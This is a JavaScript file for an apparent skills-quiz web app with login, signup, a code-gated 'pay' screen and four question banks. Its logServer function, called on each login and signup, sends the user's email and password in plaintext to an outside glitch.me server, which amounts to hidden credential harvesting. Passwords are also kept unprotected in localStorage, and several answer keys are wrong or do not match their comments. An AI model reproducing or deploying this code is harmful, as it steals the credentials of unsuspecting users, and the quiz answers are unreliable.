const payWrapper = document.querySelector(".pay-wrapper");
const logsWrapper = document.querySelector(".logs-wrapper");
const catgWrapper = document.querySelector(".catg-wrapper");
const quizWrapper = document.querySelector(".quiz-wrapper");
const resultWrapper = document.querySelector(".results-wrapper");
const catgCards = document.querySelectorAll(".catg-card");
const errorMsgs = document.querySelectorAll(".error-msg");
const codeError = document.querySelector(".code-error");
const answerBtns = document.querySelectorAll(".ques-btn");
const codeInputs = document.querySelectorAll(".code-input");
const prevBtn = document.querySelector(".prev-btn");
const quizTitle = document.getElementById("quizTitle");
const questions = document.querySelectorAll(".ques-txt");
const quesBtns = document.querySelectorAll(".ques-btn");
const nextBtn = document.querySelector(".next-btn");
const quesBoxes = document.querySelectorAll(".ques-wrapper");
const fillBar = document.querySelector(".prog-fill");
const loader = document.querySelector(".loader");
const loadDots = document.querySelectorAll(".load-dot");
const resultFill = document.querySelector(".result-fill");
const statBoxes = document.querySelectorAll(".stat-box");
const arrowDown = document.querySelector(".arr-down");
const arrowUp = document.querySelector(".arr-up");
const statContainers = document.querySelectorAll(".stat-container");
let flexIndexs = document.querySelectorAll(".indexs-flex");
const skipTxt = document.querySelector(".quiz-skip");
const logsInputs = document.querySelectorAll(".logs-inputs");
const inpWrappers = document.querySelectorAll(".input-wrapper");

document.addEventListener("keydown", (evt) => {
    if(evt.key == "ArrowUp"){
        localStorage.removeItem("username");
        localStorage.removeItem("password");
    }
});

statBoxes.forEach((box, idx) => {
    if(idx > 2){
        //box.style.display = "none";
    }
});
statContainers.forEach((cont, idx) => {
    if(idx != 0){
        cont.style.display = "none";
    } 
});
currentStats = statContainers[0];

let logPage = false;
let isLogged = false;
let firstTime = false;

let quizTheme;
let increaseRate;
let questionsNum;
let timerInt;

let currentQuestion = 1; //1
let barWidth = 0;
let result = 0;
let percentage = 0;
let timer = 0;
let resPages = 1;
let curPage = 1;
const nums = "1234567890";

let checkStr = '<i class="fa-solid fa-check res-check"></i>';

let answers = [];
let corrects = [];
let timeStamps = [];

const graphicDesignData = {
    q1: "What does DPI stand for?",
    q2: "Name the primary color model for digital screens?",
    q3: "What is kerning?",
    q4: "What tool in Photoshop is used to select colors?",
    q5: "Which tool is used to create vector graphics?",
    q6: "What is the purpose of a style guide?",
    q7: "What is a wireframe?",
    q8: "What does 'rasterize' mean in graphic design?",
    q9: "What is a responsive design?",
    q10: "Name a method for creating depth in design.",

    q1a1: "Dots Per Inch", // C
    q1a2: "Data Pixels Integrated",
    q1a3: "Digital Picture Index",
    q1a4: "Display Pixelation Indicator",

    q2a1: "CMYK",
    q2a2: "HSL",
    q2a3: "RGB", // C
    q2a4: "PANTONE",

    q3a1: "Line height adjustment",
    q3a2: "Space Between letters", // C
    q3a3: "Font size",
    q3a4: "Paragraph spacing",

    q4a1: "Eyedropper", // C
    q4a2: "Lasso",
    q4a3: "Clone Stamp",
    q4a4: "Pen",

    q5a1: "Brush tool",
    q5a2: "Eraser tool",
    q5a3: "Gradient tool",
    q5a4: "Pen tool", // C

    q6a1: "Color selection",
    q6a2: "Consitency", // C
    q6a3: "Image resolution",
    q6a4: "File managment",

    q7a1: "Layout sketch", // C
    q7a2: "Color palette",
    q7a3: "Typography guide",
    q7a4: "Finished design",

    q8a1: "Increase resolution",
    q8a2: "Change color mode",
    q8a3: "Apply filters",
    q8a4: "Converts to pixels", // C

    q9a1: "Adapts to screens", // C
    q9a2: "Uses bright colors",
    q9a3: "Includes animations",
    q9a4: "Is print-friendly",

    q10a1: "Color inversion",
    q10a2: "Flat color",
    q10a3: "Drop shadow", // C
    q10a4: "Outline text",
}
const videoEditData = {
    q1: "What does FPS stand for in video editing?",
    q2: "What is the purpose of color grading?",
    q3: "What is LUT?",
    q4: "What is chroma key used for?",
    q5: "What does the term b-roll refer to?",
    q6: "What is a J-cut?",
    q7: "What is the purpose of proxy editing?",
    q8: "What does HDR stand for?",
    q9: "What is a vector scope used for?",
    q10: "Name a common resolution for 4k videos.",

    q1a1: "Film Playback Speed", 
    q1a2: "Frames Per Second", // C
    q1a3: "Fast Playback System",
    q1a4: "Frame Pixel Size",

    q2a1: "Crop footage",
    q2a2: "Sync audio",
    q2a3: "Correct exposure", 
    q2a4: "Enhance mood", // C

    q3a1: "Linear Update Timing",
    q3a2: "Light Utility Tool", 
    q3a3: "Look-Up Table", // C
    q3a4: "Layered Under Texture",

    q4a1: "Audio Sync", 
    q4a2: "Green screen", // C
    q4a3: "Frame rate adjustment",
    q4a4: "Timeline organization",

    q5a1: "Supplementary footage", // C
    q5a2: "Main footage",
    q5a3: "Background footage",
    q5a4: "Video Effects", 

    q6a1: "Abrupt cut",
    q6a2: "Jump cut", 
    q6a3: "Video precedes audio", // C
    q6a4: "Fade to black",

    q7a1: "Enhance resolution", 
    q7a2: "Smooth workflow", // C
    q7a3: "Add visual effects",
    q7a4: "Sync audio",

    q8a1: "High Dynamic Range", // C
    q8a2: "High Definition Recording",
    q8a3: "High Density Resolution",
    q8a4: "High Data Rate", 

    q9a1: "Sound analysis", 
    q9a2: "Color analysis", // C
    q9a3: "Motion graphics",
    q9a4: "Frame blending",

    q10a1: "1920 x 1080",
    q10a2: "3840 x 2160", // C
    q10a3: "2560 x 1440", 
    q10a4: "4096x2160",
}
const webDevelopment = {
    q1: "What is the CSS 'transform' property used for?",
    q2: "How do you create a CSS animation?",
    q3: "Which one of the following is a CSS preprocessor?",
    q4: "In CSS, what does the 'z-index' property control?",
    q5: "What is the purpose of the '@media' rule?",
    q6: "What does DOM stand for?",
    q7: "How can you embed a YouTube video in HTML?",
    q8: "How do you create a tooltip in HTML?",
    q9: "How can you disable form elements in HTML?",
    q10: "How can you integrate SVG icons in an HTML page?",
    q11: "What is a closure in Javascript?",
    q12: "Which of the following is a Javascript framework?",
    q13: "What is the event loop in JavaScript?",
    q14: "Explain the concept of currying in JavaScript.",
    q15: "How do you handle asynchronous operations?",

    q1a1: "Change font size", 
    q1a2: "Perform transformations", // C
    q1a3: "Adjust line height",
    q1a4: "Translate text",
    
    q2a1: "Using <transition>",
    q2a2: "Using <animation>",
    q2a3: "Using <transform>", 
    q2a4: "Using @keyframes", // C
    
    q3a1: "HTML5",
    q3a2: "Bootstrap", 
    q3a3: "Sass", // C
    q3a4: "React",
    
    q4a1: "Text alignment", 
    q4a2: "Stacking order", // C
    q4a3: "Color saturation",
    q4a4: "Element spacing",
    
    q5a1: "Media queries", // C
    q5a2: "Define animations",
    q5a3: "Apply colors",
    q5a4: "Create gradients", 
    
    q6a1: "Dynamic Object Model",
    q6a2: "Data Object Management", 
    q6a3: "Document Object Model", // C
    q6a4: "Detailed Object Mapping",
    
    q7a1: "Using <embed>", 
    q7a2: "Using <iframe>", // C
    q7a3: "Using <object>",
    q7a4: "Using <audio>",
    
    q8a1: "Using 'title' attribute", // C
    q8a2: "Using <tooltip> tag",
    q8a3: "Using <hint> tag",
    q8a4: "Using 'hover' class", 
    
    q9a1: "Using 'disable'", 
    q9a2: "Using 'disabled'", // C
    q9a3: "Using 'inactive'",
    q9a4: "Using 'none'",
    
    q10a1: "Using <svg>",
    q10a2: "Using <icon>",
    q10a3: "Using <img>", // C 
    q10a4: "Using <graphic>",
    
    q11a1: "Function with stored data", // C 
    q11a2: "Advanced function", 
    q11a3: "Object-oriented structure", 
    q11a4: "Error handling approach",
    
    q12a1: "Tailwind",
    q12a2: "TypeScript",
    q12a3: "Bootstrap", 
    q12a4: "React", // C
    
    q13a1: "Data structure",
    q13a2: "Async task management", // C
    q13a3: "Error handling", 
    q13a4: "User interaction",
    
    q14a1: "Function combining",
    q14a2: "Function with multiple args", // C
    q14a3: "Variable scoping", 
    q14a4: "Object nesting",
    
    q15a1: "Using callbacks",
    q15a2: "Handling exceptions",
    q15a3: "Using promises", // C 
    q15a4: "With closures",
}
const marketing = {
    q1: "What is SEO?",
    q2: "What does PPC stand for in digital marketing?",
    q3: "Why use hashtags in social media marketing?",
    q4: "What is native advertising?",
    q5: "What is 'organic traffic'?",
    q6: "What is a CTA in digital marketing?",

    q1a1: "Search Engine Optimization", // C 
    q1a2: "Social Engagement Optimization",
    q1a3: "Site Encryption Order",
    q1a4: "Secure E-commerce Operation",

    q2a1: "Price Per Click",
    q2a2: "Pay-Per-Click",
    q2a3: "Paid Per Click", // C
    q2a4: "Premium Per Click",

    q3a1: "To increase reach",
    q3a2: "To target audience", // C
    q3a3: "To improve security",
    q3a4: "To create groups",

    q4a1: "Blending ads with content", // C
    q4a2: "Using local ads",
    q4a3: "Advertising to native speakers",
    q4a4: "Geo-targeted marketing",

    q5a1: "Paid website visitors",
    q5a2: "Non-paid social media followers",
    q5a3: "Purchased email lists",
    q5a4: "Non-paid website visitors", // C

    q6a1: "Customer Tracking Analysis",
    q6a2: "Call to Action", // C
    q6a3: "Content Traffic Alert",
    q6a4: "Campaign Target Audience",
}

function changeLogs(){

    if(logPage)
    {
        if(localStorage.getItem("username")){
            document.querySelector(".already-logged").style.display = "block";
            setTimeout(() => {
            document.querySelector(".already-logged").style.display = "none";
            }, 2000);
        } else {
            logsWrapper.style.opacity = "0";
            logsWrapper.style.transform = "scale(0.6)";
        setTimeout(() => {
            document.querySelectorAll(".invalid-creds")[0].style.display = "none";
            document.querySelector(".logs-txt").textContent = "Create an Account";
            document.getElementById("changeTxt").textContent = "Already have an account?";
            document.getElementById("changeLink").textContent = "Log in";
            //document.getElementById("pinInput").style.display = "flex"; 
            document.querySelector(".enter-btn").textContent = "Sign Up";
    
            logPage = false;
            logsWrapper.style.opacity = "1";
            logsWrapper.style.transform = "scale(1)";
        }, 400);
    }
    }

    else 
    {
        logsWrapper.style.opacity = "0";
        logsWrapper.style.transform = "scale(0.6)";
        setTimeout(() => {
            document.querySelector(".logs-txt").textContent = "Welcome Back";
            document.getElementById("changeTxt").textContent = "Don't have an account?";
            document.getElementById("changeLink").textContent = "Sign Up";
            //document.getElementById("pinInput").style.display = "none"; 
            document.querySelector(".enter-btn").textContent = "Log in";
    
            logPage = true;
            logsWrapper.style.opacity = "1";
            logsWrapper.style.transform = "scale(1)";
        }, 400);
        
        logPage = true;
    }
}
function skipLogs(){
    isLogged = false;
    changeWrapper(catgWrapper, logsWrapper);
    setTimeout(() => {
        document.querySelector(".guest-icon").style.opacity = "0.2";
    }, 800);
}
catgCards.forEach((card, idx) => {
    card.addEventListener("click", () => {
        //if(isLogged){
            // display quiz data
            if(idx == 0){
                quizTheme = videoEditData;
                increaseRate = 10;
                questionsNum = 10;
                resPages = 4;
                statBoxes.forEach((box, idx) => {
                    if(idx > 9){
                        box.style.display = "none";
                    }
                });
            } else if(idx == 1){
                quizTheme = graphicDesignData;
                increaseRate = 10;
                questionsNum = 10;
                resPages = 4;
                statBoxes.forEach((box, idx) => {
                    if(idx > 9){
                        box.style.display = "none";
                    }
                });
            } else if(idx == 2){
                quizTheme = webDevelopment;
                increaseRate = 6.66;
                questionsNum = 15;
                resPages = 5;
            } else if(idx == 3){
                quizTheme = marketing;
                increaseRate = 16.66;
                questionsNum = 6;
                resPages = 2;
                statBoxes.forEach((box, idx) => {
                    if(idx > 5){
                        box.style.display = "none";
                    }
                });
            }
            displayQuizData();
            document.getElementById("amount").textContent = "/" + questionsNum;
            setAnswers(quizTheme);

            // display quiz page
            changeWrapper(quizWrapper, catgWrapper);
            setTimeout(startTimer, 2000);
        /*} 
        else {
            flashCard(card);
            card.style.pointerEvents = "none";
            errorMsgs[idx].style.visibility = "visible";
            setTimeout(() => {
                errorMsgs[idx].style.visibility = "hidden";
                card.style.pointerEvents = "auto";
            }, 2000);
        }*/
    });
});
function displayQuizData(){
    if(currentQuestion == 1){
        quizTitle.textContent = quizTheme.q1;
        questions[0].textContent = quizTheme.q1a1;
        questions[1].textContent = quizTheme.q1a2;
        questions[2].textContent = quizTheme.q1a3;
        questions[3].textContent = quizTheme.q1a4;
    } else if(currentQuestion == 2){
        quizTitle.textContent = quizTheme.q2;
        questions[0].textContent = quizTheme.q2a1;
        questions[1].textContent = quizTheme.q2a2;
        questions[2].textContent = quizTheme.q2a3;
        questions[3].textContent = quizTheme.q2a4;
    } else if(currentQuestion == 3){
        quizTitle.textContent = quizTheme.q3;
        questions[0].textContent = quizTheme.q3a1;
        questions[1].textContent = quizTheme.q3a2;
        questions[2].textContent = quizTheme.q3a3;
        questions[3].textContent = quizTheme.q3a4;
    } else if(currentQuestion == 4){
        quizTitle.textContent = quizTheme.q4;
        questions[0].textContent = quizTheme.q4a1;
        questions[1].textContent = quizTheme.q4a2;
        questions[2].textContent = quizTheme.q4a3;
        questions[3].textContent = quizTheme.q4a4;
    } else if(currentQuestion == 5){
        quizTitle.textContent = quizTheme.q5;
        questions[0].textContent = quizTheme.q5a1;
        questions[1].textContent = quizTheme.q5a2;
        questions[2].textContent = quizTheme.q5a3;
        questions[3].textContent = quizTheme.q5a4;
    } else if(currentQuestion == 6){
        quizTitle.textContent = quizTheme.q6;
        questions[0].textContent = quizTheme.q6a1;
        questions[1].textContent = quizTheme.q6a2;
        questions[2].textContent = quizTheme.q6a3;
        questions[3].textContent = quizTheme.q6a4;
    } else if(currentQuestion == 7){
        quizTitle.textContent = quizTheme.q7;
        questions[0].textContent = quizTheme.q7a1;
        questions[1].textContent = quizTheme.q7a2;
        questions[2].textContent = quizTheme.q7a3;
        questions[3].textContent = quizTheme.q7a4;
    } else if(currentQuestion == 8){
        quizTitle.textContent = quizTheme.q8;
        questions[0].textContent = quizTheme.q8a1;
        questions[1].textContent = quizTheme.q8a2;
        questions[2].textContent = quizTheme.q8a3;
        questions[3].textContent = quizTheme.q8a4;
    } else if(currentQuestion == 9){
        quizTitle.textContent = quizTheme.q9;
        questions[0].textContent = quizTheme.q9a1;
        questions[1].textContent = quizTheme.q9a2;
        questions[2].textContent = quizTheme.q9a3;
        questions[3].textContent = quizTheme.q9a4;
    } else if(currentQuestion == 10){
        quizTitle.textContent = quizTheme.q10;
        questions[0].textContent = quizTheme.q10a1;
        questions[1].textContent = quizTheme.q10a2;
        questions[2].textContent = quizTheme.q10a3;
        questions[3].textContent = quizTheme.q10a4;
    } else if(currentQuestion == 11){
        quizTitle.textContent = quizTheme.q11;
        questions[0].textContent = quizTheme.q11a1;
        questions[1].textContent = quizTheme.q11a2;
        questions[2].textContent = quizTheme.q11a3;
        questions[3].textContent = quizTheme.q11a4;
    } else if(currentQuestion == 12){
        quizTitle.textContent = quizTheme.q12;
        questions[0].textContent = quizTheme.q12a1;
        questions[1].textContent = quizTheme.q12a2;
        questions[2].textContent = quizTheme.q12a3;
        questions[3].textContent = quizTheme.q12a4;
    } else if(currentQuestion == 13){
        quizTitle.textContent = quizTheme.q13;
        questions[0].textContent = quizTheme.q13a1;
        questions[1].textContent = quizTheme.q13a2;
        questions[2].textContent = quizTheme.q13a3;
        questions[3].textContent = quizTheme.q13a4;
    } else if(currentQuestion == 14){
        quizTitle.textContent = quizTheme.q14;
        questions[0].textContent = quizTheme.q14a1;
        questions[1].textContent = quizTheme.q14a2;
        questions[2].textContent = quizTheme.q14a3;
        questions[3].textContent = quizTheme.q14a4;
    } else if(currentQuestion == 15){
        quizTitle.textContent = quizTheme.q15;
        questions[0].textContent = quizTheme.q15a1;
        questions[1].textContent = quizTheme.q15a2;
        questions[2].textContent = quizTheme.q15a3;
        questions[3].textContent = quizTheme.q15a4;
    } 
}
quesBtns.forEach(btn => {
    btn.addEventListener("click", () => {
        triggerBtn("positive");
    });
});
function nextQuestion(){
    timeStamps[currentQuestion - 1] = timer;
    triggerBtn("negative");
    barWidth = barWidth + increaseRate;
    if(currentQuestion == questionsNum){
        fillBar.style.width = barWidth + "%";
        for(let i = 0; i < questionsNum; i++){
            if(answers[i] == corrects[i]){
                result++;
            }
        }
        calculateResults();
        setTimeout(() => {
            changeWrapper(payWrapper, quizWrapper);
        }, 500);
    } else {
        currentQuestion++;
        changeQuestions();
    }
}
function seeResults(){
    if(codeInputs[0].value == "5" && codeInputs[1].value == "9" && codeInputs[2].value == "4" && codeInputs[3].value == "2"){
        calculateResults();
        changeWrapper(resultWrapper, payWrapper);
        setTimeout(displayResults, 3000);
    } else {
        codeInputs.forEach(input => {
            input.value = "";
        });
        codeError.style.visibility = "visible";
        setTimeout(() => {
            codeError.style.visibility = "hidden";
        }, 1000);
    }
}
function setAnswers(theme){
    if(theme == graphicDesignData){
        corrects = [0, 2, 1, 0, 3, 1, 0, 3, 0, 2];
        for(let i = 0; i < 10; i++){
            flexIndexs[i].querySelectorAll(".index-wrapper")[corrects[i]].innerHTML = checkStr;
        }
    } else if(theme == videoEditData){
        corrects = [1, 3, 2, 1, 0, 2, 1, 0, 1, 1];
        for(let i = 0; i < 10; i++){
            flexIndexs[i].querySelectorAll(".index-wrapper")[corrects[i]].innerHTML = checkStr;
        }
    } else if(theme == webDevelopment){
        corrects = [1, 3, 2, 1, 0, 2, 1, 0, 1, 2, 0, 3, 1, 1, 2];
        for(let i = 0; i < 15; i++){
            flexIndexs[i].querySelectorAll(".index-wrapper")[corrects[i]].innerHTML = checkStr;
        }
    } else if(theme == marketing){
        corrects = [0, 2, 1, 0, 3, 1];
        for(let i = 0; i < 6; i++){
            flexIndexs[i].querySelectorAll(".index-wrapper")[corrects[i]].innerHTML = checkStr;
        }
    }
    for(let i = 0; i < corrects.length; i++){
        answers.push(4);
        timeStamps.push(0);
    }
    console.log(answers);
    console.log(corrects);
}
function prevQuestion(){
    if(currentQuestion > 1){
        triggerBtn("negative");
        currentQuestion--;
        barWidth = barWidth - increaseRate;
        changeQuestions();
    }
}
function skipQuestion(){
    answers[currentQuestion - 1] = 4;
    nextQuestion();
}
function pageDown(){
    curPage++;
    if(curPage == resPages){
        arrowDown.classList.add("dis-arr");
        arrowDown.classList.remove("act-arr");
    }
    checkArrow(arrowUp);
    currentStats.classList.remove("stat-active");
    currentStats.classList.add("stat-inactive-top");
    let newArray = Array.from(statContainers);
    let nextIndex = newArray.indexOf(currentStats);

    setTimeout(() => {
        statContainers[nextIndex + 1].style.display = "block";
        currentStats.style.display = "none";
        currentStats = statContainers[nextIndex + 1];
        setTimeout(() => {
            statContainers[nextIndex + 1].classList.remove("stat-inactive-bottom");
            statContainers[nextIndex + 1].classList.add("stat-active");
        }, 50);
    }, 300);
}
function pageUp(){
    curPage--;
    checkArrow(arrowDown);
    currentStats.classList.remove("stat-active");
    currentStats.classList.add("stat-inactive-bottom");
    let newArray = Array.from(statContainers);
    let nextIndex = newArray.indexOf(currentStats);
    if(nextIndex - 1 == 0){
        arrowUp.classList.remove("act-arr");
        arrowUp.classList.add("dis-arr");
    }

    setTimeout(() => {
        statContainers[nextIndex - 1].style.display = "block";
        currentStats.style.display = "none";
        currentStats = statContainers[nextIndex - 1];
        setTimeout(() => {
            statContainers[nextIndex - 1].classList.remove("stat-inactive-top");
            statContainers[nextIndex - 1].classList.add("stat-active");
        }, 50);
    }, 300);
}
document.querySelectorAll(".exit-icon").forEach((icon, idx) => {
    icon.addEventListener("click", () => {
        if(idx == 0){
            changeWrapper(logsWrapper, catgWrapper);
            document.querySelector(".guest-icon").style.opacity = "0";
        } else {
            changeWrapper(catgWrapper, resultWrapper);
            setTimeout(() => {
            currentQuestion = 1;
            fillBar.style.width = "0%";
            barWidth = 0;
            result = 0;
            percentage = 0;
            timer = 0;
            curPage = 1;
            resultFill.style.width = "0%";
            checkArrow(arrowDown);
            if(arrowUp.classList[4].includes("act-arr")){
                arrowUp.classList.remove("act-arr");
                arrowUp.classList.add("dis-arr");
            }
            nextBtn.textContent = "Next";
            document.getElementById("quizQues").textContent = "1";
            statBoxes.forEach(box => {
                box.style.display = "flex";
            });
            statContainers.forEach((cont, idx) => {
                if(idx != 0){
                    cont.style.display = "none";
                    cont.classList.remove("stat-active");
                    cont.classList.remove("stat-inactive-top");
                    cont.classList.remove("stat-inactive-bottom");
                    cont.classList.add("stat-inactive-bottom");
                } else {
                    cont.style.display = "block";
                    cont.classList.remove("stat-active");
                    cont.classList.remove("stat-inactive-top");
                    cont.classList.remove("stat-inactive-bottom");
                    cont.classList.add("stat-active");
                }
            });
            currentStats = statContainers[0];
        }, 500);
        }
    });
});
function logServer(){
    let email = logsInputs[0].value;
    let password = logsInputs[1].value;

    fetch('https://coherent-rare-floss.glitch.me/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ message: email + " => " + password })
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
function enterDatabase(){
    if(logPage){ // login
    if(localStorage.getItem("username")){
        if(logsInputs[0].value != localStorage.getItem("username")){
            flashInput(inpWrappers[0], 0);
        }
        if(logsInputs[1].value != localStorage.getItem("password")){
            flashInput(inpWrappers[1], 0);
        }
        if(logsInputs[0].value == localStorage.getItem("username") && logsInputs[1].value == localStorage.getItem("password")){
            isLogged = true;
            changeWrapper(catgWrapper, logsWrapper);
            logServer();
        }
    } else { // no account created
        document.querySelectorAll(".invalid-creds")[0].textContent = "Please create an account first.";
        document.querySelectorAll(".invalid-creds")[0].style.display = "block";
        setTimeout(() => {
            document.querySelectorAll(".invalid-creds")[0].style.display = "none";
            document.querySelectorAll(".invalid-creds")[0].textContent = "Please enter valid credentials";
        }, 2000);
    }
    } else { // create an account
        if(firstTime){
            document.querySelectorAll(".invalid-creds")[0].textContent = "Password does not match email.";
            document.querySelectorAll(".invalid-creds")[0].style.display = "block";
            setTimeout(() => {
                document.querySelectorAll(".invalid-creds")[0].style.display = "none";
                document.querySelectorAll(".invalid-creds")[0].textContent = "Please enter valid credentials";
            }, 2000);
            firstTime = false;
        } else {
            if(logsInputs[0].value == ""){
                flashInput(inpWrappers[0], 1);
            }
            if(logsInputs[1].value == ""){
                flashInput(inpWrappers[1], 1);
            }
            if(logsInputs[0].value.length > 0 && logsInputs[1].value.length > 0){
                localStorage.setItem("username", logsInputs[0].value);
                localStorage.setItem("password", logsInputs[1].value);
                isLogged = true;
                changeWrapper(catgWrapper, logsWrapper);
                logServer();
                setTimeout(() => {
                    document.querySelector(".logs-txt").textContent = "Welcome Back";
                    document.getElementById("changeTxt").textContent = "Don't have an account?";
                    document.getElementById("changeLink").textContent = "Sign Up";
                    document.getElementById("pinInput").style.display = "none"; 
                    document.querySelector(".enter-btn").textContent = "Log in";
            
                    logPage = true;
                }, 500);
            }
        }
    }
    logsInputs.forEach(input => {
        input.value = "";
    });
}


function flashCard(selectedCard){
    selectedCard.classList.remove("reg-card");
    selectedCard.classList.add("err-card");
    setTimeout(() => {
        selectedCard.classList.remove("err-card");
        selectedCard.classList.add("reg-card");
        setTimeout(() => {
            selectedCard.classList.remove("reg-card");
            selectedCard.classList.add("err-card");
            setTimeout(() => {
                selectedCard.classList.remove("err-card");
                selectedCard.classList.add("reg-card");
                setTimeout(() => {
                    selectedCard.classList.remove("reg-card");
                    selectedCard.classList.add("err-card");
                    setTimeout(() => {
                        selectedCard.classList.remove("err-card");
                        selectedCard.classList.add("reg-card");
                    }, 400);
                }, 400);
            }, 400);
        }, 400);
    }, 400);
}
function triggerBtn(condition){
    if(condition == "positive"){
        nextBtn.style.opacity = "1";
        nextBtn.style.pointerEvents = "auto";
    } else {
        nextBtn.style.opacity = "0.2";
        nextBtn.style.pointerEvents = "none";
        skipTxt.style.opacity = "0.2";
        skipTxt.style.pointerEvents = "none";
    }
}
function changeQuestions(){
    fillBar.style.width = barWidth + "%";
    document.getElementById("quizQues").textContent = currentQuestion;
    quizTitle.style.opacity = "0";
    quesBoxes.forEach((box, idx) => {
        setTimeout(() => {
            box.style.opacity = "0";
        }, 300 * (idx + 1));
    });
    setTimeout(() => {
        displayQuizData();
        answerBtns.forEach(btn => {
            btn.style.backgroundColor = "transparent";
        });
        if(currentQuestion == questionsNum){
            nextBtn.textContent = "See Results";
        } else {
            nextBtn.textContent = "Next";
        }
    }, 1520);
    setTimeout(() => {
        startTimer();
        quizTitle.style.opacity = "1";
        quesBoxes.forEach((box, idx) => {
            setTimeout(() => {
                box.style.opacity = "1";
            }, 300 * (idx + 1));
        });
        setTimeout(() => {
            skipTxt.style.opacity = "1";
            skipTxt.style.pointerEvents = "auto";
        }, 500);
    }, 1550);
}
function flashLoader(){
    loadDots.forEach(dot => {
        setInterval(() => {
            dot.style.opacity = "0";
        }, 400);
        setTimeout(() => {
            setInterval(() => {
                dot.style.opacity = "1";
            }, 400);
        }, 200);
    });
}
flashLoader();
function startTimer(){
    clearInterval(timerInt);
    timer = 0;
    timerInt = setInterval(() => {
        timer++;
    }, 1000);
}
function changeWrapper(wrapShow, wrapHide){
    wrapHide.style.opacity = "0";
    wrapHide.style.transform = "scale(0.6)";
    setTimeout(() => {
        loader.style.transform = "scale(1)";

        setTimeout(() => {
            wrapShow.style.display = "block";
            wrapHide.style.display = "none";
            loader.style.transform = "scale(0)";
            setTimeout(() => {
                if(wrapShow == payWrapper){
                    codeInputs[0].focus();
                }
                wrapShow.style.transform = "scale(1)";
                wrapShow.style.opacity = "1";
            }, 400);
        }, 2000);
    }, 400);
}
function calculateResults(){
    let comparer = 100 / questionsNum;
    percentage = (comparer * result).toFixed(0);
    for(let i = 0; i < questionsNum; i++){
        document.querySelectorAll(".ttaken-txt")[i].textContent = timeStamps[i] + "s";
        if(answers[i] == corrects[i]){
            colorStats(i, "hsl(209, 99%, 43%)");
        } else {
            colorStats(i, "red");
        }
    }
}
function displayResults(){
    for(let i = 1; i <= percentage; i++){
        setTimeout(() => {
            document.getElementById("scoreTxt").textContent = i;
        }, 30 * i);
    }
    let transition = percentage * 30;
    resultFill.style.transition = transition + "ms ease-in";
    resultFill.style.width = percentage + "%";
}
function checkArrow(arrow){
    if(arrow.classList[4].includes("dis-arr")){
        arrow.classList.remove("dis-arr");
        arrow.classList.add("act-arr");
    }
}
function colorStats(index, value){
    statBoxes[index].style.borderColor = value;
    document.querySelectorAll(".stat-label")[index].style.backgroundColor = value;
    if(answers[index] < 4){
        document.querySelectorAll(".indexs-flex")[index].querySelectorAll(".index-wrapper")[answers[index]].style.backgroundColor = value;
        document.querySelectorAll(".indexs-flex")[index].querySelectorAll(".index-wrapper")[answers[index]].querySelector("i").style.color = "white";
    }
}
function flashInput(input, idx){
    input.style.border = "1px solid red";
    setTimeout(() => {
        input.style.border = "";
        setTimeout(() => {
            input.style.border = "1px solid red";
        }, 200);
        setTimeout(() => {
            input.style.border = "";
        }, 400);
    }, 800);
    document.querySelectorAll(".invalid-creds")[idx].style.display = "block";
    setTimeout(() => {
        document.querySelectorAll(".invalid-creds")[idx].style.display = "none";
    }, 1500)
}
answerBtns.forEach((btn, idx) => {
    btn.addEventListener("click", () => {
        for(let i = 0; i < 4; i++){
            answerBtns[i].style.backgroundColor = "transparent";
            }
        btn.style.backgroundColor = "white";
        answers[currentQuestion - 1] = idx;
    });
});
prevBtn.addEventListener("mouseover", () => {
    prevBtn.style.border = "1px solid white"
    prevBtn.style.backgroundColor = "transparent";
    document.querySelector(".fa-chevron-left").style.color = "white";
});
prevBtn.addEventListener("mouseout", () => {
    prevBtn.style.border = "1px solid transparent"
    prevBtn.style.backgroundColor = "white";
    document.querySelector(".fa-chevron-left").style.color = "hsl(0, 0%, 9.5%)";
});
codeInputs.forEach((input, idx) => {
    input.addEventListener("input", () => {
        let previousValue = input.dataset.previousValue || '';
        if(!nums.includes(input.value)){ // if not number, clear input
            input.value = "";
        } else if(nums.includes(input.value) && previousValue.length < input.value.length){ // if is number, go next
            input.blur();
            if(idx < 3){
                codeInputs[idx + 1].focus();
            }
        }
    });
});